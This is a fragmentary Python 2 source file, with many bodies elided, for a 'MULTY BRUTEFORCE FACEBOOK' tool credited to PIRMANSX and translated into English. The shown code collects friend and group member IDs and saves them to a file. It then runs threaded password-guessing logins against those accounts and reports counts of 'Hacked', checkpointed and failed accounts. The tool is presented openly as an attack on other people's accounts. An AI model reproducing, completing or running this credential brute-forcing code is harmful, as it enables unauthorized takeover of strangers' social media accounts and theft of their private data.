...
if platform.python_version().split('.')[0] != '2':
	tampil('\rm[!] you use python version %s please use version 2.x.x'%v().split(' ')[0])
	os.sys.exit()
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				tampil('\rm[!] Enter the options Bro...')
				continue
		else:
			if len(a) == 0:
...
def simpan():
	...
	if len(id_friend) != 0:
		...
		try:
			...
			tampil('\rh[!]Save Successfully \rcMBFfreinds.txt')
		except:
			tampil('\rm[!] Failed to save')
def buka(d):
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rm[!] Account hit checkpoint\n\rk[!]Try logging in with opera mini')
		Exit()
	else:
...
def idgroup():
	...
	while 1:
		...
		try:
			...
			tampil('\rm[!]The id are \rh %d id'%len(id_bgroup))
			break
	simpan()
...
class mt(threading.Thread):
    ...
    def run(self):
        ...
        if 'm_sess' in data.url or 'save-device' in data.url:
            ...
            self.a = 0
def crack(d):
	i = inputD('[?]Take Password list/Manual (p/m)',['P','M'])
	if i.upper() == 'P':
		while 1:
			...
			try:
				...
				tampil('\rm[!]Failed to open \rk%s'%dir)
				continue
			break
...
def crack0(data,sandi,p):
	...
	while 1:
		try:
			for i in th:
				a = i.update()
				if a[0] != 3 and a[1] not in account_jml:
					jml0 += 1
					if a[0] == 2:
						account_checkpoint.append(a[1])
					elif a[0] == 1:
						account_success.append(a[1])
					elif a[0] == 0:
						account_failed.append(a[1])
					elif a[0] == 8:
						account_error.append(a[1])
					print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
					os.sys.stdout.flush()
					account_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
		try:
	...
	if len(account_success) != 0:
		tampil('\rh[*]Hacked')
		for i in account_success:
			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rh[*] Number of Hacked Accounts\rp      %d'%len(account_success))
	tampil('\rm[*]Number of faild Accounts\rp           %d'%len(account_failed))
	tampil('\rk[*]Number of Verification Account\rp  %d'%len(account_checkpoint))
	tampil('\rc[*]Number of Accounts error\rp           %d'%len(account_error))
	if p:
...
def menu():
	tampil('''\rh
           ...
           {\rmX\rh}v{\rmX\rh}|\rcPRX\rh|==========.
             [']  /'|'\           \\
                 /  \  \           '
                 \_  \_ \_ _    \rk*\rhDragonFly ZomBie
\rk#############################################################
#             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                #
# \rhBY\rp                                         PIRMANSX \rk#
# \rhGitHub\rp                  https://github.com/pirmansx \rk#
# \rhUploaded by                    Ahlyab Zuse             \rh#
# \rhGitHub\rp                  https://github.com/Ahlyab   \rh#
# \rhOrignal version indonesian language                    \rh#
# \rhTranslate to english by Ahlyab Zuse                    \rh#
# \rhGitHub\rp                    https:\\github.com/Ahlyab \rh#
